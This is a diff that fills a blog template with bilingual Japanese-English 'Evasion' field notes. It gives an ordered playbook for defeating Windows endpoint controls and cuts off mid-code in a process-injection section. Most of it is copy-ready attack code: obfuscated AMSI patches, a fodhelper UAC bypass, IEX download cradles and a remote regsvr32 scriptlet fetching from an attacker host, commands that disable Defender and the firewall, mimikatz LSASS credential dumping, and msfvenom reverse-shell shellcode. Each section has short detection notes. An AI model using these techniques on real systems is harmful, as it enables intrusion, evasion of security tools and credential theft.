@@ -7,8 +7,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>&lt;TITLE&gt; — d0me</title>
-<meta name="description" content="&lt;説明&gt;">
+<title>Evasion — d0me</title>
+<meta name="description" content="Field notes on endpoint control bypasses — AppLocker, CLM, AMSI, Defender, PPL, UAC, injection.">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -28,9 +28,9 @@
 <main>
 <section class="sheet-hero">
   <div class="wrap">
-    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>&lt;TITLE&gt;</div>
-    <h1>&lt;TITLE&gt;</h1>
-    <p class="lede">&lt;リード文（英）&gt;<span class="jp">&lt;リード文（和）&gt;</span></p>
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Evasion</div>
+    <h1>Evasion</h1>
+    <p class="lede">An ordered flow for bypassing modern endpoint controls, from recon to injection.<span class="jp">エンドポイント防御層を越える実行順序ノート、偵察から注入まで。</span></p>
   </div>
 </section>
 
@@ -39,32 +39,541 @@
   <aside class="toc">
     <div class="toc-label">目次</div>
     <ul>
-      <li><a href="#s1">01 &lt;節&gt;</a></li>
-      <li><a href="#ref">02 参照</a></li>
+      <li><a href="#s01">01 Environment Recon</a></li>
+      <li><a href="#s02">02 AppLocker / WDAC</a></li>
+      <li><a href="#s03">03 CLM Bypass</a></li>
+      <li><a href="#s04">04 AMSI Bypass</a></li>
+      <li><a href="#s05">05 UAC Bypass</a></li>
+      <li><a href="#s06">06 Defender Control</a></li>
+      <li><a href="#s07">07 PPL Bypass</a></li>
+      <li><a href="#s08">08 SeImpersonate → SYSTEM</a></li>
+      <li><a href="#s09">09 Process Injection / EDR Evasion</a></li>
+      <li><a href="#s10">10 Chaining &amp; Order</a></li>
     </ul>
   </aside>
 
   <article class="doc">
-    <section id="s1" class="reveal">
-      <h2><span class="num">01</span>&lt;節見出し&gt;<span class="jp">&lt;subtitle&gt;</span></h2>
-      <p>&lt;本文&gt;</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># コメント</span>
-command --flag <span class="v">&lt;PLACEHOLDER&gt;</span></code></pre></div>
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Environment Recon<span class="jp">環境偵察</span></h2>
+      <p>Payload 選定・注入先選定に不可欠な前段調査。ミスマッチは即失敗を招くため、ホスト到達直後の実行を推奨する。</p>
 
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul><li>&lt;対策&gt;</li></ul>
+      <h3>Architecture (32 / 64 bit)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>echo %PROCESSOR_ARCHITECTURE%
+echo %PROCESSOR_ARCHITEW6432%</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>[System.Environment]::Is64BitOperatingSystem
+[System.Environment]::Is64BitProcess
+[IntPtr]::Size    <span class="c"># 8 = 64bit process, 4 = 32bit process</span></code></pre></div>
+
+      <p>プロセス単位の bit 判定 (注入先選定用):</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-Process | Where-Object { $_.Path } | ForEach-Object {
+    $is64 = $_.Path -notlike "*Program Files (x86)*"
+    [PSCustomObject]@{ Name=$_.Name; PID=$_.Id; Is64=$is64; Path=$_.Path }
+} | Format-Table</code></pre></div>
+
+      <p>VBA マクロ内でのアーキ判定 (初期実行段階):</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">vb</span><button class="copy">copy</button></div>
+<pre><code>Sub CheckArch()
+    Dim is64 As Boolean
+    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
+    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'")
+    For Each p In procs
+        is64 = (InStr(1, p.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)
+        Exit For
+    Next
+End Sub</code></pre></div>
+
+      <h3>Defense enumeration</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>echo === [Defender]  === &amp; sc query WinDefend
+echo === [Firewall]  === &amp; netsh advfirewall show allprofiles state
+echo === [UAC]       === &amp; reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+echo === [AppLocker] === &amp; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
+echo === [EDR]       === &amp; tasklist /svc | findstr /i "sense carbonblack cylance crowdstrike sentinel tanium sophos cortex elastic"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Defender 詳細</span>
+Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected, BehaviorMonitorEnabled
+
+<span class="c"># CLM 状態 (FullLanguage / ConstrainedLanguage / RestrictedLanguage / NoLanguage)</span>
+$ExecutionContext.SessionState.LanguageMode
+
+<span class="c"># AppLocker ポリシー</span>
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+
+<span class="c"># AMSI 初期化状態 (True = バイパス済み)</span>
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
+
+<span class="c"># PPL (LSASS 保護状態)</span>
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" -ErrorAction SilentlyContinue
+
+<span class="c"># ScriptBlockLogging</span>
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</code></pre></div>
+
+      <h3>Decision matrix</h3>
+      <table>
+        <thead><tr><th>Recon 結果</th><th>次のアクション</th></tr></thead>
+        <tbody>
+          <tr><td><code>Is64BitProcess=True</code></td><td>x64 ペイロード (<code>windows/x64/...</code>)</td></tr>
+          <tr><td><code>Is64BitProcess=False</code></td><td>x86 ペイロード。または SysWOW64 経由の 64bit powershell.exe を強制</td></tr>
+          <tr><td><code>LanguageMode=ConstrainedLanguage</code></td><td>Section 03 (CLM bypass) を必須実行、.NET ベースへ</td></tr>
+          <tr><td>AppLocker 有効</td><td>Section 02 (LOLBAS / InstallUtil 経由)</td></tr>
+          <tr><td><code>IsTamperProtected=True</code></td><td><code>Set-MpPreference</code> 不可 → サービス停止 / 定義削除へ</td></tr>
+          <tr><td>Real-time protection 有効</td><td>certutil / bitsadmin 直取得は検知される → 暗号化ペイロード</td></tr>
+          <tr><td>EDR プロセス検出</td><td>Defender 無効化のみでは不十分 → Section 09 (Direct Syscall / Unhook)</td></tr>
+          <tr><td><code>RunAsPPL=1</code></td><td>Mimikatz <code>sekurlsa::*</code> 不可 → Section 07 (mimidrv / vulnerable driver)</td></tr>
+        </tbody>
+      </table>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>短時間に発行される <code>Get-MpComputerStatus</code> / <code>Get-AppLockerPolicy</code> / <code>Get-ItemProperty ...\Lsa</code> の連鎖は PowerShell/Operational (EID 4104) で追跡可能</li>
+          <li>WMI 経由の <code>SELECT * FROM Win32_Process</code> は Microsoft-Windows-WMI-Activity/Operational で観測できる</li>
+          <li><code>tasklist /svc | findstr</code> による EDR プロダクト名列挙は Sysmon EID 1 で親子関係とともに残る</li>
+        </ul>
       </div>
+    </section>
+
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>AppLocker / WDAC<span class="jp">アプリ実行制御バイパス</span></h2>
+
+      <h3>Default write-allowed paths (LOLBAS)</h3>
+      <p>AppLocker デフォルトルールが実行を許可しているパス。書込可否は環境依存のため <code>icacls</code> で確認する。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">text</span><button class="copy">copy</button></div>
+<pre><code>C:\Windows\Tasks\
+C:\Windows\Tracing\
+C:\Windows\Temp\                                (Admin 要となる環境あり)
+C:\Windows\System32\spool\PRINTERS\
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>icacls C:\Windows\Tasks
+echo test &gt; C:\Windows\Tasks\test.txt &amp;&amp; del C:\Windows\Tasks\test.txt</code></pre></div>
+
+      <h3>InstallUtil (.NET assembly)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code><span class="c">REM 64-bit</span>
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.exe
+
+<span class="c">REM 32-bit</span>
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.exe</code></pre></div>
+
+      <h3>MSBuild (XML project 直接実行)</h3>
+      <p>公開実装として <a href="https://github.com/Sh3lldon/FullBypass" target="_blank" rel="noopener">Sh3lldon/FullBypass</a> が知られる。csproj 内 <code>Task</code> にインラインで C# を書き、msbuild.exe に食わせる形。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Windows\Tasks\project.csproj</code></pre></div>
+
+      <h3>regsvr32 (SCT scriptlet)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>regsvr32 /s /n /u /i:http://<span class="v">&lt;LHOST&gt;</span>/payload.sct scrobj.dll</code></pre></div>
+
+      <h3>rundll32 (mshtml)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX(...)")</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>AppLocker: EID 8003 (audit) / 8004 (block) を SIEM に取り込む。まず audit で LOLBAS 実行を可視化してから enforce へ</li>
+          <li>Sysmon EID 1 の親子関係で <code>winword.exe → InstallUtil.exe</code> 等の連鎖を検知</li>
+          <li>WDAC 側で <code>msbuild.exe</code> / <code>installutil.exe</code> をブロックリストに含めるとバイパスの多くを潰せる</li>
+          <li>書込許可パスの厳格化 (<code>C:\Windows\Tasks</code> 等) と定期監査</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>CLM Bypass<span class="jp">ConstrainedLanguage 脱出</span></h2>
+
+      <h3>Detection &amp; impact</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$ExecutionContext.SessionState.LanguageMode
+<span class="c"># ConstrainedLanguage 下では以下が制限される:</span>
+<span class="c">#   - .NET 直接呼び出し ([System.X]::method)</span>
+<span class="c">#   - Add-Type</span>
+<span class="c">#   - New-Object (一部 COM を除く)</span></code></pre></div>
+
+      <h3>Bypass via public implementation</h3>
+      <p>公開実装として <a href="https://github.com/calebstewart/bypass-clm" target="_blank" rel="noopener">calebstewart/bypass-clm</a> がある。ビルド後の実行ファイルを Section 02 の InstallUtil 経由で走らせ、FullLanguage の新規セッションを得る。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe</code></pre></div>
+
+      <h3>Custom runspace (.NET Framework 4.8)</h3>
+      <p>必要参照: <code>System.Configuration.Install</code>, <code>System.Management.Automation.dll</code></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">csharp</span><button class="copy">copy</button></div>
+<pre><code>using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass {
+    class Program { static void Main(string[] args) { } }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : Installer {
+        public override void Uninstall(System.Collections.IDictionary savedState) {
+            string cmd = "IEX (New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/re.ps1')";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}</code></pre></div>
+      <p>ビルド出力を難読化ツール (ConfuserEx 等) で処理し、InstallUtil 経由で実行。取得セッションで <code>$ExecutionContext.SessionState.LanguageMode</code> が <code>FullLanguage</code> になっていることを確認。</p>
+
+      <h3>PowerShell v2 downgrade (Windows Server 2012 R2 以前)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>powershell -version 2 -nop -ep bypass</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>PowerShell/Operational (EID 400/403) で LanguageMode の変化を検知</li>
+          <li>Windows Server 2016+ では PSv2 features を削除、SCM で PSv2 起動を封じる</li>
+          <li>WDAC で InstallUtil を潰すと CLM bypass の主要経路も同時に閉じる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>AMSI Bypass<span class="jp">スクリプトスキャン回避</span></h2>
+
+      <div class="note warn"><span class="lbl">Note</span>新規 <code>powershell.exe</code> セッション・新規 Runspace ごとにプロセス揮発する。CLM bypass の後に実行すること (ConstrainedLanguage 下では <code>[Ref]</code> が制限される)。</div>
+
+      <h3>amsiInitFailed flag patch</h3>
+      <p>素の形は静的シグネチャで検知される。難読化版で動かす。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Original (detected)</span>
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># 軽量難読化 (wildcard 検索)</span>
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Failed"){$f=$e}};$f.SetValue($null,$true)</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># amsiContext memory 書換版</span>
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># format-token 分割 (autologging 減衰)</span>
+"GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})</code></pre></div>
+
+      <h3>AmsiScanBuffer memory patch (RastaMouse 方式)</h3>
+      <p>P/Invoke で <code>amsi.dll!AmsiScanBuffer</code> の先頭を <code>0xB8 0x57 0x00 0x07 0x80 0xC3</code> (<code>mov eax, 0x80070057; ret</code>) で上書きし、<code>AMSI_RESULT_INVALIDARG</code> を強制返却させる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$LDUCS = @"
+using System; using System.Runtime.InteropServices;
+public class LDUCS {
+  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
+  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
+  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+}
+"@
+Add-Type $LDUCS
+$lib  = [LDUCS]::LoadLibrary("amsi.dll")
+$addr = [LDUCS]::GetProcAddress($lib, "AmsiScanBuffer")
+$p = 0
+[LDUCS]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
+[Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)</code></pre></div>
+
+      <h3>EXE / DLL 内 AMSI bypass</h3>
+      <p><code>AmsiContext</code> の <code>signatureSize</code> を負値で上書きする方式が CLR 内 AMSI に有効。実装カタログとして <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a>。</p>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>PowerShell/Operational (EID 4104) スクリプトブロックログで <code>amsiInitFailed</code> / <code>AmsiScanBuffer</code> / <code>[Ref].Assembly.GetType('...AmsiUtils')</code> の chain をパターン化</li>
+          <li>EDR による <code>amsi.dll</code> メモリスキャン (先頭 8 バイト整合性チェック)</li>
+          <li>WDAC + PowerShell CLM の組合せで .NET P/Invoke 型 bypass の多くを封じる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>UAC Bypass<span class="jp">整合性レベル昇格</span></h2>
+
+      <h3>Integrity level check</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>whoami /groups | findstr /i "Mandatory"
+<span class="c">REM S-1-16-8192  = Medium (UAC バイパス要)</span>
+<span class="c">REM S-1-16-12288 = High   (バイパス済み)</span></code></pre></div>
+
+      <h3>fodhelper</h3>
+      <p><code>powershell.exe</code> の名前をリネームして (レジストリ値の "powershell" 文字列自体が Defender トリガーになる)、fodhelper.exe が起動時に参照する registry key を仕込む。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/re.ps1')"
+$b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+$payload = "C:\Windows\Tasks\stager.exe -enc $b64"
+
+copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\stager.exe
+
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force
+
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+Start-Sleep -s 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue</code></pre></div>
+
+      <h3>ComputerDefaults (fodhelper 代替)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\Tasks\stager.exe -enc &lt;BASE64_PAYLOAD&gt;" -Force
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"</code></pre></div>
+
+      <h3>EventViewer (.NET deserialization)</h3>
+      <p>公開 PoC: <a href="https://github.com/CsEnox/EventViewer-UACBypass" target="_blank" rel="noopener">CsEnox/EventViewer-UACBypass</a></p>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>Sysmon EID 12/13/14 (Registry) で <code>HKCU:\Software\Classes\ms-settings\</code> 配下の書換を検知</li>
+          <li>Security EID 4657 (レジストリ値の変更) と組合せて誤検知を絞る</li>
+          <li>UAC を Always Notify に強制、標準ユーザ運用の徹底</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Defender Control<span class="jp">リアルタイム保護制御</span></h2>
+
+      <div class="note warn"><span class="lbl">Requires</span>Admin または SYSTEM 整合性。Medium から実行しても効果はない。</div>
+
+      <h3>Real-time protection disable (TamperProtection=False 前提)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -SubmitSamplesConsent NeverSend
+Set-MpPreference -MAPSReporting Disabled</code></pre></div>
+
+      <h3>Signature deletion</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -DynamicSignatures</code></pre></div>
+
+      <h3>Exclusions</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+Add-MpPreference -ExclusionExtension "exe","ps1","dll"
+Add-MpPreference -ExclusionProcess "powershell.exe"</code></pre></div>
+
+      <h3>TamperProtection 有効時</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>sc stop WinDefend
+sc config WinDefend start= disabled
+
+<span class="c">REM さらに改ざん保護が強い環境では SYSTEM 権限で DISM 削除</span>
+dism /online /disable-feature /featurename:Windows-Defender /norestart</code></pre></div>
+
+      <h3>Firewall</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>Defender ETW (<code>Microsoft-Windows-Windows Defender/Operational</code>): EID 5000/5001 (real-time 状態変化), 5007 (config 変更), 3002 (exclusion 追加)</li>
+          <li>TamperProtection の全社的有効化。無効化された事実自体を SIEM で監視</li>
+          <li><code>MpCmdRun.exe -RemoveDefinitions</code> の実行は EDR/AV telemetry で高信頼シグナル</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>PPL Bypass<span class="jp">LSASS 保護解除</span></h2>
+
+      <p>LSASS が Protected Process Light 下にある場合、Mimikatz の <code>sekurlsa::*</code> は失敗する。解除の代表的経路は 2 系統。</p>
+
+      <h3>mimidrv.sys ロード方式</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"</code></pre></div>
+
+      <h3>Vulnerable driver 悪用 (PPLKiller)</h3>
+      <p><code>RTCore64.sys</code> 経由でカーネル書換を行う公開実装。<a href="https://github.com/Mattiwatti/PPLKiller" target="_blank" rel="noopener">Mattiwatti/PPLKiller</a>。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>PPLKiller.exe /installDriver
+PPLKiller.exe /disableLSAProtection</code></pre></div>
+
+      <h3>Verification</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+<span class="c"># 0 になればバイパス成功</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>Credential Guard + RunAsPPL の併用。物理環境でも仮想化ベースセキュリティを有効化</li>
+          <li>Microsoft の <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules" target="_blank" rel="noopener">脆弱ドライバブロックリスト</a>を WDAC 経由で適用</li>
+          <li>Sysmon EID 6 で <code>RTCore64.sys</code> 等の既知脆弱ドライバのロードを検知</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>SeImpersonate → SYSTEM<span class="jp">サービスアカウント昇格</span></h2>
+
+      <h3>Privilege check</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"</code></pre></div>
+
+      <h3>PrintSpoofer (Spooler 稼働時)</h3>
+      <p>公開実装: <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener">itm4n/PrintSpoofer</a></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>PrintSpoofer64.exe -i -c cmd</code></pre></div>
+
+      <h3>GodPotato (.NET 4.8+ 全 Windows 対応)</h3>
+      <p>公開実装: <a href="https://github.com/BeichenDream/GodPotato" target="_blank" rel="noopener">BeichenDream/GodPotato</a></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Tasks\rev.exe"</code></pre></div>
+
+      <h3>SigmaPotato (リフレクション読込)</h3>
+      <p>メモリ上のみで実行、ディスク書込なし。公開実装: <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank" rel="noopener">tylerdotrar/SigmaPotato</a></p>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>サービスアカウントに <code>SeImpersonatePrivilege</code> を付与しない設計</li>
+          <li>不要な Spooler サービスは停止 / 無効化 (プリントサーバ以外)</li>
+          <li>Named Pipe 生成の異常パターン (<code>\\.\pipe\spoolss</code> 直後の SYSTEM プロセス起動) を EDR で検知</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Process Injection / EDR Evasion<span class="jp">プロセス注入とフック回避</span></h2>
+
+      <h3>Target process selection</h3>
+      <ul>
+        <li>64bit ペイロードは 64bit プロセスへのみ注入可能</li>
+        <li>注入先プロセスのトークン権限を継承する</li>
+        <li>候補: <code>explorer.exe</code> (ユーザコンテキスト), <code>svchost.exe</code> (SYSTEM), <code>spoolsv.exe</code> (SYSTEM + SeImpersonate 保有環境あり)</li>
+      </ul>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-Process | Where-Object { $_.Path -and $_.Path -notlike "*Program Files (x86)*" } | Select-Object Name,Id,Path
+Get-Process explorer | Select-Object Id, Path</code></pre></div>
+
+      <h3>Shellcode generation (XOR obfuscation)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>LHOST=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+
+<span class="c"># 64-bit</span>
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f csharp -o sc64.cs
+
+<span class="c"># XOR (key=0xfa) 済みバイト列</span>
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f raw \
+  | python3 -c "import sys; d=sys.stdin.buffer.read(); print(','.join(f'0x{b^0xfa:02x}' for b in d))"
+
+<span class="c"># 32-bit</span>
+msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=443 EXITFUNC=thread -f csharp -o sc32.cs</code></pre></div>
+
+      <h3>CreateRemoteThread injection (定番 / 検知容易)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">csharp</span><button class="copy">copy</button></div>
+<pre><code>using System;
+using System.Runtime.InteropServices;
+
+class Program {
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int p);
+    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")] static extern bool  WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out IntPtr w);
+    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
+
+    static void Main(string[] args) {
+        int pid = System.Diagnostics.Process.GetProcessesByName("explorer")[0].Id;
